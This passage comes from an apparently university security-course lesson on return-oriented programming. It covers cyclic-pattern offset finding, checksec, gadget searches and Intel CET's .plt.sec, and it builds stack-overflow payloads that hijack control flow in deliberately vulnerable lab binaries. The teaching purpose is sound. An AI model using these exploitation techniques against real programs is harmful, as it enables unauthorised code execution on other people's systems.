&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">read&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">buf&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">100&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">return&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It&amp;rsquo;s a fairly simple overflow, but just how fast can you figure out the offset
to the return address? How much padding do you need? There is a shortcut that
you can use to figure this out in under 30 seconds without looking at the
&lt;em>Assembly&lt;/em> code.&lt;/p>
&lt;p>A &lt;a href="https://en.wikipedia.org/wiki/De_Bruijn_sequence">De Bruijn sequence&lt;/a> is a
string of symbols out of a given alphabet in which each consecutive K symbols
only appear once in the whole string. If we can construct such a string out of
printable characters then we only need to know the Segmentation Fault address.
Converting it back to 4 bytes and searching for it in the initial string will
give us the exact offset to the return address.&lt;/p>
&lt;p>&lt;a href="">pwndbg&lt;/a> can help you do this, using the
&lt;a href="https://docs.pwntools.com/en/stable/util/cyclic.html">cyclic&lt;/a> package from the
&lt;code>pwnlib&lt;/code> library:&lt;/p>
&lt;pre tabindex="0">&lt;code>pwndbg&amp;gt; cyclic 100 # create a 100-character long De Bruijn sequence
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
pwndbg&amp;gt; cyclic -l aaa # as addresses are 4 or 8 bytes long, you cannot search for a shorter pattern
[CRITICAL] Subpattern must be 4 bytes
pwndbg&amp;gt; cyclic -l faaa # the offset of faaa in the above cyclic pattern is 20
20
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>pwndbg&amp;gt; cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
pwndbg&amp;gt; run
Starting program: /media/teo/2TB/Chestii/Poli/SSS/Exploit/sss-exploit/sessions/return-oriented-programming/hello
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Program received signal SIGSEGV, Segmentation fault.
0x080491d1 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────
EAX 0x0
EBX 0x0
ECX 0x61616172 (&amp;#39;raaa&amp;#39;)
EDX 0xfbad2288
EDI 0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
ESI 0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
EBP 0x61616173 (&amp;#39;saaa&amp;#39;)
ESP 0x61616178 (&amp;#39;uaaa&amp;#39;)
EIP 0x61616174 (&amp;#39;taaa&amp;#39;)
──────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────
Invalid address 0x61616174
[...]
pwndbg&amp;gt; cyclic -l 0x61616174
76
&lt;/code>&lt;/pre>&lt;p>From the above commands we can deduce that EIP&amp;rsquo;s offset relative to the start of
the buffer is 76, as the address that EIP points to is &lt;code>0x61616174&lt;/code>, i.e.
&lt;code>'taaa'&lt;/code>, which lies at offset 76 in the cyclic pattern we&amp;rsquo;ve just generated.&lt;/p>
&lt;h3 id="checksec-in-pwndbg">checksec in pwndbg&lt;/h3>
&lt;pre tabindex="0">&lt;code>pwndbg&amp;gt; checksec
[*] &amp;#39;/media/teo/2TB/Chestii/Poli/SSS/Exploit/sss-exploit/sessions/return-oriented-programming/hello&amp;#39;
Arch: i386-32-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x8048000)
&lt;/code>&lt;/pre>&lt;h3 id="finding-gadgets-in-pwndbg">Finding Gadgets in &lt;code>pwndbg&lt;/code>&lt;/h3>
&lt;pre tabindex="0">&lt;code>pwndbg&amp;gt; rop
Gadgets information
============================================================
0x080490fa : adc al, 0x68 ; sbb al, 0xc0 ; add al, 8 ; call eax
0x08049146 : adc byte ptr [eax + 0x68], dl ; sbb al, 0xc0 ; add al, 8 ; call edx
0x08049104 : adc cl, cl ; ret
0x0804909b : adc dword ptr [eax - 0x2e], -1 ; call dword ptr [eax - 0x73]
0x0804917c : add al, 8 ; add ecx, ecx ; ret
0x080490fe : add al, 8 ; call eax
0x0804914b : add al, 8 ; call edx
0x0804918c : add byte ptr [eax], al ; add byte ptr [eax], al ; endbr32 ; jmp 0x8049120
[...]
Unique gadgets found: 121
pwndbg&amp;gt; rop --grep &amp;#34;pop .* ; pop .* ; ret&amp;#34; # you can perform a finer search using the --grep parameter and regular expressions
0x0804923d : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804923c : jecxz 0x80491c1 ; les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x0804923b : jne 0x8049220 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804923e : les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x0804923f : or al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
0x08049240 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08049242 : pop edi ; pop ebp ; ret
0x08049241 : pop esi ; pop edi ; pop ebp ; ret
&lt;/code>&lt;/pre>&lt;h2 id="further-reading">Further Reading&lt;/h2>
&lt;h3 id="rop-gadgets-in-pwntools">ROP Gadgets in &lt;code>pwntools&lt;/code>&lt;/h3>
&lt;p>&lt;code>pwntools&lt;/code> has a rather advanced
&lt;a href="https://docs.pwntools.com/en/stable/rop/rop.html">ROP module&lt;/a> that is capable
of crafting ROP attacks corresponding to various functions by creating
concatenating chains of ROP adresses, also known as ROP chains.&lt;/p>
&lt;p>For this session, you won&amp;rsquo;t need to use this module, but it may come in handy in
the future.&lt;/p>
&lt;h3 id="linux-x86-program-start-up">Linux x86 Program Start Up&lt;/h3>
&lt;p>Notice that the &lt;code>__libc_start_main&lt;/code> will always be present in the relocation
table. As you discovered in the session dedicated to
&lt;a href="https://github.com/hexcellents/sss-binary/tree/master/sessions/executable-file-formats">executable file formats&lt;/a>,
this is the function called by the code from the &lt;code>_start&lt;/code> label, which, in turn,
calls the &lt;code>main()&lt;/code> function.&lt;/p>
&lt;p>To find more details about the startup of a Linux x86 program, you can read
about it
&lt;a href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html">here&lt;/a>.&lt;/p>
&lt;h3 id="the-pltsec-schema">The &lt;code>.plt.sec&lt;/code> Schema&lt;/h3>
&lt;p>Let&amp;rsquo;s go back to the small piece of code at the beginning of this lecture:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">#include&lt;/span> &lt;span style="color:#8f5902;font-style:italic">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#8f5902;font-style:italic">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">int&lt;/span> &lt;span style="color:#000">main&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#204a87;font-weight:bold">void&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">puts&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;Hello world!&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">return&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If we compile it with a more modern (later than 2019) version of even the most
&amp;ldquo;old-school&amp;rdquo; compilers, such as &lt;code>gcc&lt;/code>, we will notice a slight (but actually
important) difference in the &lt;code>.plt&lt;/code> schema used by the resulting binary file.&lt;/p>
&lt;pre tabindex="0">&lt;code>$ gcc -m32 -fno-PIC -no-pie hello.c -o hello
$ objdump -M intel -d hello
[...]
Disassembly of section .plt:
08049030 &amp;lt;.plt&amp;gt;:
8049030: ff 35 04 c0 04 08 push DWORD PTR ds:0x804c004
8049036: ff 25 08 c0 04 08 jmp DWORD PTR ds:0x804c008
804903c: 0f 1f 40 00 nop DWORD PTR [eax+0x0]
8049040: f3 0f 1e fb endbr32
8049044: 68 00 00 00 00 push 0x0
8049049: e9 e2 ff ff ff jmp 8049030 &amp;lt;.plt&amp;gt;
804904e: 66 90 xchg ax,ax
8049050: f3 0f 1e fb endbr32
8049054: 68 08 00 00 00 push 0x8
8049059: e9 d2 ff ff ff jmp 8049030 &amp;lt;.plt&amp;gt;
804905e: 66 90 xchg ax,ax
Disassembly of section .plt.sec:
08049060 &amp;lt;puts@plt&amp;gt;:
8049060: f3 0f 1e fb endbr32
8049064: ff 25 0c c0 04 08 jmp DWORD PTR ds:0x804c00c
804906a: 66 0f 1f 44 00 00 nop WORD PTR [eax+eax*1+0x0]
[...]
&lt;/code>&lt;/pre>&lt;p>Now it seems there are two &lt;code>.plt&lt;/code> sections: the &amp;ldquo;classic&amp;rdquo; &lt;code>.plt&lt;/code> and a new
&lt;code>.plt.sec&lt;/code> section. Moreover, the entries in the &lt;code>.plt.sec&lt;/code> section are very
similar to those we&amp;rsquo;ve previously shown as being part of &lt;code>.plt&lt;/code>. So why 2
&lt;code>.plt&lt;/code>&amp;rsquo;s? And if the initial &lt;code>.plt&lt;/code> entries have been moved over to &lt;code>.plt.sec&lt;/code>,
what is the purpose of the &lt;code>.plt&lt;/code> section now?&lt;/p>
&lt;p>First, let&amp;rsquo;s check the call to &lt;code>puts()&lt;/code> itself:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ objdump -D -j .text -M intel hello | grep puts
80491b3: e8 a8 fe ff ff call 8049060 &amp;lt;puts@plt&amp;gt;
&lt;/code>&lt;/pre>&lt;p>So we see that the function being called now resides in the &lt;code>.plt.sec&lt;/code> section.
What about the offset that &lt;code>.plt.sec&lt;/code> redirect jumps to (i.e. &lt;code>0x804c00c&lt;/code>)?&lt;/p>
&lt;pre tabindex="0">&lt;code>$ objdump -s -M intel -j .got.plt --start-address=0x0804c00c hello
hello: file format elf32-i386
Contents of section .got.plt:
804c00c 40900408 50900408 @...P...
&lt;/code>&lt;/pre>&lt;p>Similarly to what we did previously, we now see that &lt;code>0x804c00c&lt;/code> points to
address &lt;code>0x08049040&lt;/code>, which is this code inside the &lt;code>.plt&lt;/code> section:&lt;/p>
&lt;pre tabindex="0">&lt;code>8049040: f3 0f 1e fb endbr32
8049044: 68 00 00 00 00 push 0x0
8049049: e9 e2 ff ff ff jmp 8049030 &amp;lt;.plt&amp;gt;
804904e: 66 90 xchg ax,ax
&lt;/code>&lt;/pre>&lt;p>So with the &lt;code>.plt.sec&lt;/code> schema, there are 2 redirects: one from &lt;code>.plt.sec&lt;/code> to
&lt;code>.got&lt;/code> (or &lt;code>.got.plt&lt;/code> to be more precise) and another from &lt;code>.got.plt&lt;/code> to &lt;code>.plt&lt;/code>.
Notice in the &lt;code>.plt&lt;/code> stub above that, like before, &lt;code>0x0&lt;/code> is pushed onto the
stack before the resolver is called, so that the dynamic linker can change it to
the actual address of &lt;code>puts()&lt;/code> from libc.&lt;/p>
&lt;p>So why use &lt;code>.plt.sec&lt;/code> at all if in the end it looks like it does the same thing?
Well, &lt;code>.plt.sec&lt;/code> is an x86-only security enhancement of the &lt;code>.plt&lt;/code> section
(hence the &lt;code>.sec&lt;/code> part of the name, duh&amp;hellip;), that is used only when a security
enhancement feature called &lt;strong>CET (Control-flow Enforcement Technology)&lt;/strong> is
enabled. In this comment, I&amp;rsquo;ll explain what the feature is and why we have two
PLT sections if CET is enabled.&lt;/p>
&lt;p>So, what does CET do? CET introduces a new restriction to indirect jump
instructions. In order to understand how CET works, let&amp;rsquo;s assume that it is
enabled. Then, if you execute an indirect jump instruction, the processor
verifies that a special &amp;ldquo;landing pad&amp;rdquo; instruction, which is actually a
repurposed &lt;code>NOP&lt;/code> instruction (now called &lt;code>endbr32&lt;/code> or &lt;code>endbr64&lt;/code>, as you can see
in the above snippets), is at the jump target. If the jump target does not start
with that instruction, the processor raises an exception instead of continuing
to execute code.&lt;/p>
&lt;p>If CET is enabled, the compiler places &lt;code>endbr&lt;/code> instructions to all locations
where indirect jumps may lead. This mechanism makes it extremely hard to
transfer the control to a middle of a function that is not supporsed to be a
indirect jump target, preventing certain types of attacks, such as ROP or JOP
(jump-oriented programming; very similar to ROP).&lt;/p>
&lt;p>Now, let&amp;rsquo;s explain why we have this extra PLT section for when CET is enabled.
Since you can indirectly jump to a PLT entry, we have to make PLT entries start
with an &lt;code>endbr&lt;/code> instruction. The problem is there was no extra space for &lt;code>endbr&lt;/code>
(which is 4 bytes long) in the old &lt;code>.plt&lt;/code> entry schema, as the PLT entry is only
16 bytes long and all of them are already used.&lt;/p>
&lt;p>In order to deal with the issue, each PLT entry was splt into two separate
entries. Remember that each PLT entry contains code to jump to an address read
from &lt;code>.got.plt&lt;/code> &lt;strong>AND&lt;/strong> code to resolve a dynamic symbol lazily. With the 2-PLT
schema, the former code is written to &lt;code>.plt.sec&lt;/code>, and the latter code is written
to &lt;code>.plt&lt;/code>, as demonstrated above.&lt;/p>
&lt;h4 id="more-about-cet-and-endbr">More about CET and &lt;code>endbr&lt;/code>&lt;/h4>
&lt;ul>
&lt;li>A more in-depth look at the inner workings of CET and the concept of the
&lt;strong>Shadow Stack&lt;/strong> that it uses, can be found
&lt;a href="https://software.intel.com/content/www/us/en/develop/articles/technical-look-control-flow-enforcement-technology.html">here&lt;/a>
and
&lt;a href="https://software.intel.com/content/www/us/en/develop/articles/technical-look-control-flow-enforcement-technology.html">here&lt;/a>&lt;/li>
&lt;li>The way &lt;code>endbr&lt;/code> instructions interact with the CPU is explained
&lt;a href="https://cdrdv2.intel.com/v1/dl/getContent/631121">here&lt;/a>, at page 38&lt;/li>
&lt;/ul>
&lt;h4 id="tldr">TLDR&lt;/h4>
&lt;p>Lazy symbol resolution in the 2-PLT schema works in the usual way, except
that the regular &lt;code>.plt&lt;/code> is now called &lt;code>.plt.sec&lt;/code> and &lt;code>.plt&lt;/code> is repurposed to
contain only code for lazy symbol resolution.&lt;/p>
&lt;h2 id="putting-it-all-together-demo">Putting it all Together: Demo&lt;/h2>
&lt;p>Now that we&amp;rsquo;ve learned the theoretical aspects of what Return Oriented
Programming is, let&amp;rsquo;s put everything in practice as part of a demo.&lt;/p>
&lt;p>Navigate to the folder &lt;a href="activities/00-demo">00-demo&lt;/a>. Notice that it contains
two executables, one compiled for 32 bits (&lt;code>vuln&lt;/code>) and the other for 64 bits
(&lt;code>vuln64&lt;/code>). TODO: diff&lt;/p>
&lt;p>Looking at their source code (it&amp;rsquo;s one and the same for both of them), we can
easily identify their vulnerability: the &lt;code>reader&lt;/code> function reads (duh&amp;hellip;) 128
bytes from &lt;code>stdin&lt;/code> into a buffer whose capacity is only 64 bytes. So we&amp;rsquo;ll be
able to overflow this buffer. We aim to do this in order to showcase the concept
of &lt;strong>code reuse&lt;/strong>.&lt;/p>
&lt;h3 id="calling-a-function">Calling a Function&lt;/h3>
&lt;p>The most basic type of code reuse is calling a function. For this, we&amp;rsquo;ll be
calling the &lt;code>warcraft&lt;/code> function in the &lt;code>vuln&lt;/code> and &lt;code>vuln64&lt;/code> binaries mentioned
above. In order to do this, we&amp;rsquo;ll need to know:&lt;/p>
&lt;ol>
&lt;li>the offset of the return address inside our buffer&lt;/li>
&lt;li>the address of the &lt;code>warcraft&lt;/code> function inside the binary.&lt;/li>
&lt;/ol>
&lt;p>For all our exploits we&amp;rsquo;ll be using the &lt;code>exploit.py&lt;/code> script, which is also
available in the &lt;a href="activities/00-demo">00-demo&lt;/a> folder. Notice that &lt;code>pwntools&lt;/code>
provides a functionality similar to &lt;code>nm&lt;/code>, by which we can obtain the addresses
of various sybols in the binary (as long as it hasn&amp;rsquo;t been stripped):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">e&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">ELF&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">filename&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">warcraft_address&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">e&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">symbols&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">b&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;warcraft&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>As of now, requirement #2 mentioned above is complete. In order to also complete
the first requirement, we&amp;rsquo;ll use &lt;code>objdump&lt;/code> and check the &lt;code>reader&lt;/code> function:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ objdump -M intel -d vuln
08048529 &amp;lt;reader&amp;gt;:
8048529: 55 push ebp
804852a: 89 e5 mov ebp,esp
804852c: 83 ec 40 sub esp,0x40
[...]
804853c: a1 40 a0 04 08 mov eax,ds:0x804a040
8048541: 50 push eax
8048542: 68 80 00 00 00 push 0x80
8048547: 8d 45 c0 lea eax,[ebp-0x40]
804854a: 50 push eax
804854b: e8 10 fe ff ff call 8048360 &amp;lt;fgets@plt&amp;gt;
&lt;/code>&lt;/pre>&lt;p>Our vulnerable buffer is the first parameter of &lt;code>fgets&lt;/code>, which is at offset
&lt;code>ebp - 0x40&lt;/code> i.e. &lt;code>ebp - 64&lt;/code>. Which means that the offset of the return address
is &lt;code>64 + 4 = 68&lt;/code> bytes into this buffer (remember how a stack frame looks like).&lt;/p>
&lt;p>So, in order to call the &lt;code>warcraft&lt;/code> function, we&amp;rsquo;ll give our binary a payload
made up of a padding of 68 bytes, followed by the address of &lt;code>warcraft&lt;/code>, written
in &lt;em>little endian&lt;/em> representation, which can be written like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">offset&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0x40&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">+&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">4&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">payload&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">offset&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*&lt;/span> &lt;span style="color:#4e9a06">b&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;A&amp;#34;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">+&lt;/span> &lt;span style="color:#000">pack&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">warcraft_address&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now our exploit is done. In order to perform this exploit on &lt;code>vuln64&lt;/code>, simply
run &lt;code>objdump&lt;/code> on this binary and remember that the length of a pointer on a
64-bit architecture is 8 bytes, which means that the offset of the return
address is going to be &lt;code>rbp + 8&lt;/code>.&lt;/p>
&lt;p>One thing to keep in mind is that you are by no means required to use addresses
that point to the beginning of functions in your payloads. You can use any valid
address from the &lt;code>.text&lt;/code> section and the exploit should work just fine in
executing code from the address you provide it.&lt;/p>
&lt;p>Now on to our next scenario: what if the function we&amp;rsquo;re calling requires a
parameter?&lt;/p>
&lt;h3 id="calling-a-function-with-parameters">Calling a Function with Parameters&lt;/h3>
&lt;p>Let&amp;rsquo;s first look at the stack of a function when it&amp;rsquo;s called &amp;ldquo;normally&amp;rdquo;, i.e.
with a &lt;code>call&lt;/code> instruction. Let&amp;rsquo;s use the &lt;code>overwatch&lt;/code> function in &lt;code>vuln.c&lt;/code> as an
example. The picture below shows where its parameter is placed.&lt;/p>
&lt;p>&lt;img src="assets/overwatch_stack_simple.png" alt="Overwatch Stack">&lt;/p>
&lt;p>Furthermore, as expected, the function retrieves its parameter from address
&lt;code>ebp + 8&lt;/code>, as shown above. How can we craft a payload so that, upon entering the
function, the required &lt;code>0xdeadbeef&lt;/code> parameter is where the function expects it
to be?&lt;/p>
&lt;p>We&amp;rsquo;ll obviously need to place &lt;code>0xdeadbeef&lt;/code> on the stack (in little endian
representation, of course), but where? After the function&amp;rsquo;s preamble
(&lt;code>push ebp; mov esp, ebp&lt;/code>), &lt;code>ebp&lt;/code> points to the location where the previous
stack pointer it saved. Above it, the function expects to find its return
address. Thus, we need to write 4 padding bytes in its place. The next 4 bytes
are the first parameter. Just for reference, the next 4 bytes (&lt;code>ebp + 12&lt;/code>) are
the second parameter and so on. So, in order to call &lt;code>overwatch&lt;/code> with the
&lt;code>0xdeadbeef&lt;/code> parameter, the payload would look like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">payload&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">offset&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*&lt;/span> &lt;span style="color:#4e9a06">b&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;A&amp;#34;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">+&lt;/span> &lt;span style="color:#000">pack&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">overwatch_address&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">+&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">4&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*&lt;/span> &lt;span style="color:#4e9a06">b&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;B&amp;#34;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">+&lt;/span> &lt;span style="color:#000">pack&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0xdeadbeef&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Take a look at those 4 &lt;code>B&lt;/code>&amp;rsquo;s in the payload above. We agreed that they are
&lt;code>overwatch&lt;/code>&amp;rsquo;s expected return address. So if we wanted to call another function,
we would only need to replace them with that function&amp;rsquo;s address. Pretty simple,
right? But what if we wanted to call a third function? Well, then we would need
to overwrite the next 4 bytes in our payload with a third address. Easy! But now
we have actually run into trouble: the next 4 bytes are &lt;code>overwatch&lt;/code>&amp;rsquo;s parameter.
In this situation it looks like we &lt;strong>either&lt;/strong> call &lt;code>overwatch&lt;/code> or we call a third
function. Not cool. In this case, &lt;code>overwatch&lt;/code>s stack would look like this:&lt;/p>
&lt;p>&lt;img src="assets/overwatch_stack_conflict.png" alt="Overwatch Stack with Conflicting Parameter/Address">&lt;/p>
&lt;p>It seems we need another mechanism so that we can call &lt;strong>all 3 functions&lt;/strong> with
all their correct parameters. Enter ROPs!&lt;/p>
&lt;h3 id="calling-multiple-functions">Calling Multiple Functions&lt;/h3>
&lt;p>What we need in order to solve the dilemma presented above is a means by which
to &lt;strong>remove&lt;/strong> &lt;code>overwatch&lt;/code>&amp;rsquo;s parameter (i.e. &lt;code>0xdeadbeef&lt;/code>) from the stack once
the function is finished. We know that the &lt;code>pop&lt;/code> instruction is good for
removing stuff from the stack. So what we need is to execute the following two
instructions:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-assembly" data-lang="assembly">pop &amp;lt;any_register&amp;gt;
ret
&lt;/code>&lt;/pre>&lt;p>Since &lt;code>ret&lt;/code> is equivalent to &lt;code>pop eip&lt;/code>, the above code removes &lt;code>0xdeadbeef&lt;/code> from
the stack and places the instruction pointer (&lt;code>eip&lt;/code>) at the address lying on the
stack above &lt;code>0xdeadbeef&lt;/code>. One thing to keep in mind is that now we&amp;rsquo;re only
interested in clearing the stack, so &lt;code>pop&lt;/code> can be used with any 32 bit register.&lt;/p>
&lt;p>As a result, &lt;code>overwatch&lt;/code>&amp;rsquo;s stack should look like the one in the image below.
Notice there are no more conflicts now. Hurray!&lt;/p>
&lt;p>&lt;img src="assets/overwatch_stack_no_conflict.png" alt="Overwatch Stack without Conflicting Parameters and Addresses">&lt;/p>
&lt;h4 id="finding-gadgets---ropgadget">Finding Gadgets - &lt;code>ROPgadget&lt;/code>&lt;/h4>
&lt;p>The &lt;code>pop; ret&lt;/code> instructions above are called a &lt;strong>gadget&lt;/strong>, i.e. a small group of
&lt;strong>consecutive&lt;/strong> instructions that ends in &lt;code>ret&lt;/code> and which can be used to alter
the execution of a given program. Since all binaries contain a &lt;code>.text&lt;/code> section,
which is made up of instructions, all binaries contain gadgets. Lots of them.&lt;/p>
&lt;p>The tool that we&amp;rsquo;re going to use in order to find such gadgets is called
&lt;code>ROPgadget&lt;/code>. It is already installed in the Kali VM and if you&amp;rsquo;re working on
another environment, you can install it by following the instructions in the
tool&amp;rsquo;s &lt;a href="https://github.com/JonathanSalwan/ROPgadget">Github repo&lt;/a>.&lt;/p>
&lt;p>In order to run &lt;code>ROPgadget&lt;/code> from your terminal, you need to specify a binary
file to it using the &lt;code>--binary&lt;/code> parameter. It is also recommended (if you know
what gadgets you&amp;rsquo;re looking for) to filter those you need using the &lt;code>--only&lt;/code>
parameter. As a result, in order to obtain a &lt;code>pop; ret&lt;/code> gadget, we need to run
the following command:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ROPgadget --binary vuln --only &lt;span style="color:#4e9a06">&amp;#34;pop|ret&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Gadgets &lt;span style="color:#000">information&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ce5c00;font-weight:bold">============================================================&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x080485eb : pop ebp &lt;span style="color:#000;font-weight:bold">;&lt;/span> ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x080485e8 : pop ebx &lt;span style="color:#000;font-weight:bold">;&lt;/span> pop esi &lt;span style="color:#000;font-weight:bold">;&lt;/span> pop edi &lt;span style="color:#000;font-weight:bold">;&lt;/span> pop ebp &lt;span style="color:#000;font-weight:bold">;&lt;/span> ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x08048331 : pop ebx &lt;span style="color:#000;font-weight:bold">;&lt;/span> ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x080485ea : pop edi &lt;span style="color:#000;font-weight:bold">;&lt;/span> pop ebp &lt;span style="color:#000;font-weight:bold">;&lt;/span> ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x080485e9 : pop esi &lt;span style="color:#000;font-weight:bold">;&lt;/span> pop edi &lt;span style="color:#000;font-weight:bold">;&lt;/span> pop ebp &lt;span style="color:#000;font-weight:bold">;&lt;/span> ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x0804831a : ret
